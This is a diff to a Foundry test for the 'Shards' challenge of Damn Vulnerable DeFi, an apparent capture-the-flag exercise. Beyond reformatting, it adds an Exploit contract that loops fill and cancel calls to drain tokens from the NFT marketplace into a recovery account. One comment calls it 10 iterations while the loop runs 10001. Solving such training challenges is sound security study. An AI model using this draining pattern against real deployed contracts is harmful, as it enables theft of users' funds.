@@ -3,13 +3,7 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {
-    ShardsNFTMarketplace,
-    IShardsNFTMarketplace,
-    ShardsFeeVault,
-    DamnValuableToken,
-    DamnValuableNFT
-} from "../../src/shards/ShardsNFTMarketplace.sol";
+import {ShardsNFTMarketplace, IShardsNFTMarketplace, ShardsFeeVault, DamnValuableToken, DamnValuableNFT} from "../../src/shards/ShardsNFTMarketplace.sol";
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
 
 contract ShardsChallenge is Test {
@@ -63,8 +57,13 @@ contract ShardsChallenge is Test {
         token = new DamnValuableToken();
 
         // Deploy NFT marketplace and get the associated fee vault
-        marketplace =
-            new ShardsNFTMarketplace(nft, token, address(new ShardsFeeVault()), oracle, MARKETPLACE_INITIAL_RATE);
+        marketplace = new ShardsNFTMarketplace(
+            nft,
+            token,
+            address(new ShardsFeeVault()),
+            oracle,
+            MARKETPLACE_INITIAL_RATE
+        );
         feeVault = marketplace.feeVault();
 
         // Deploy DVT staking contract and enable staking of fees in marketplace
@@ -80,7 +79,11 @@ contract ShardsChallenge is Test {
         token.approve(address(marketplace), SELLER_DVT_BALANCE); // for fees
         nft.setApprovalForAll(address(marketplace), true);
         for (uint256 id = 0; id < SELLER_NFT_BALANCE; id++) {
-            marketplace.openOffer({nftId: id, totalShards: NFT_OFFER_SHARDS, price: NFT_OFFER_PRICE});
+            marketplace.openOffer({
+                nftId: id,
+                totalShards: NFT_OFFER_SHARDS,
+                price: NFT_OFFER_PRICE
+            });
         }
 
         initialTokensInMarketplace = token.balanceOf(address(marketplace));
@@ -101,7 +104,10 @@ contract ShardsChallenge is Test {
         assertEq(marketplace.offerCount(), SELLER_NFT_BALANCE);
         assertEq(marketplace.rate(), MARKETPLACE_INITIAL_RATE);
         assertGt(marketplace.feesInBalance(), 0);
-        assertEq(token.balanceOf(address(marketplace)), marketplace.feesInBalance());
+        assertEq(
+            token.balanceOf(address(marketplace)),
+            marketplace.feesInBalance()
+        );
 
         assertEq(staking.rate(), STAKING_RATE);
         assertEq(staking.balanceOf(address(feeVault)), 0);
@@ -114,7 +120,9 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        Exploit exploit = new Exploit(marketplace, token, recovery);
+        exploit.attack(1);
+        console.log("recovery balance", token.balanceOf(address(recovery)));
     }
 
     /**
@@ -122,17 +130,58 @@ contract ShardsChallenge is Test {
      */
     function _isSolved() private view {
         // Balance of staking contract didn't change
-        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS, "Not enough tokens in staking rewards");
+        assertEq(
+            token.balanceOf(address(staking)),
+            STAKING_REWARDS,
+            "Not enough tokens in staking rewards"
+        );
 
         // Marketplace has less tokens
-        uint256 missingTokens = initialTokensInMarketplace - token.balanceOf(address(marketplace));
-        assertGt(missingTokens, initialTokensInMarketplace * 1e16 / 100e18, "Marketplace still has tokens");
+        uint256 missingTokens = initialTokensInMarketplace -
+            token.balanceOf(address(marketplace));
+        assertGt(
+            missingTokens,
+            (initialTokensInMarketplace * 1e16) / 100e18,
+            "Marketplace still has tokens"
+        );
 
         // All recovered funds sent to recovery account
-        assertEq(token.balanceOf(recovery), missingTokens, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            missingTokens,
+            "Not enough tokens in recovery account"
+        );
         assertEq(token.balanceOf(player), 0, "Player still has tokens");
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+contract Exploit {
+    ShardsNFTMarketplace public marketplace;
+    DamnValuableToken public token;
+    address recovery;
+
+    constructor(
+        ShardsNFTMarketplace _marketplace,
+        DamnValuableToken _token,
+        address _recovery
+    ) {
+        marketplace = _marketplace;
+        token = _token;
+        recovery = _recovery;
+    }
+
+    function attack(uint64 offerId) external {
+        uint256 wantShards = 100; // Fill 100 shards per call
+
+        // Loop 10 times to execute fill(1, 100)
+        for (uint256 i = 0; i < 10001; i++) {
+            marketplace.fill(offerId, wantShards);
+            marketplace.cancel(1, i);
+        }
+
+        token.transfer(recovery, token.balanceOf(address(this)));
     }
 }
